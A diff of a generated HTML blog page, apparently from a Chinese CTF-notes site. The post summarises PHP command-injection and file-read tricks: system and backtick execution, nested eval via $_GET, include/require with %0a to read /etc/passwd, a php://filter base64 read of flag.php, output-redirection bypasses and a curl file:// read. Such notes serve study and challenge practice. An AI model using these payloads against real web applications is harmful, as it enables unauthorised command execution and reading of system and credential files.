@@ -214,9 +214,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br />
-命令注入产生的原因：<br />
-1. web网站没有对用户提交的参数进行有效的检测过滤。<br />
+        <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br>
+命令注入产生的原因：<br>
+1. web网站没有对用户提交的参数进行有效的检测过滤。<br>
 2. 操作系统允许一条语句执行多条命令（连接符和管道符）</p>
 <p>windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性|
 |ipconfig|查看当前ip地址| |netstat|查看网络端口及连接情况| |net
@@ -232,8 +232,8 @@ localgroup|查看、增加、删除当前系统用户组|
 |userdel|删除用户| |passwd|修改用户密码|</p>
 <table>
 <colgroup>
-<col style="width: 72%" />
-<col style="width: 27%" />
+<col style="width: 72%">
+<col style="width: 27%">
 </colgroup>
 <thead>
 <tr class="header">
@@ -261,7 +261,7 @@ localgroup|查看、增加、删除当前系统用户组|
 </tbody>
 </table>
 <h2 id="section">------</h2>
-<hr />
+<hr>
 <p>PHP最后一条语句可以没有分号。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = system(&quot;cp flag.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
 反引号`和system函数作用相同 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = `cp flag.php 1.txt`</span><br></pre></td></tr></table></figure> 嵌套执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</span><br></pre></td></tr></table></figure>
 tac倒序输出文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = include%0a$_GET[1];&amp;1=/etc/passwd</span><br><span class="line"></span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure> 语言结构（不需要使用括号）
@@ -271,17 +271,17 @@ echo print isset unset include require</p>
 <p>phpinfo()的返回值是1</p>
 </blockquote>
 <blockquote>
-<p>print_r(get_defined_vars());<br />
-输出当前所有变量<br />
-array_pop(next(get_defined_vars()));<br />
-弹出数组的值<br />
+<p>print_r(get_defined_vars());<br>
+输出当前所有变量<br>
+array_pop(next(get_defined_vars()));<br>
+弹出数组的值<br>
 eval()即可执行</p>
 </blockquote>
 <blockquote>
-<p>/&gt;dev/null 2&gt;&amp;1<br />
-无回显，可用双写绕过<br />
-<code>?c=ls;ls</code><br />
-第一个命令正常输出<br />
+<p>/&gt;dev/null 2&gt;&amp;1<br>
+无回显，可用双写绕过<br>
+<code>?c=ls;ls</code><br>
+第一个命令正常输出<br>
 <code>&amp;&amp;</code></p>
 </blockquote>
 <blockquote>
@@ -296,11 +296,11 @@ eval()即可执行</p>
 <blockquote>
 <p>构造数字</p>
 </blockquote>
-<p>文件读取<br />
+<p>文件读取<br>
 * file_get_contents * highlight_file * show_source</p>
 <p>包含文件后
 <code>var_dump(get_defined_vars())</code>或<code>echo $flag</code></p>
-<p>查看目录<br />
+<p>查看目录<br>
 <code>print_r(scandir('.'));</code></p>
 <p>curl <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;file://var/www/html/flag.php&quot;;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 
@@ -402,7 +402,7 @@ eval()即可执行</p>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -415,7 +415,7 @@ eval()即可执行</p>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
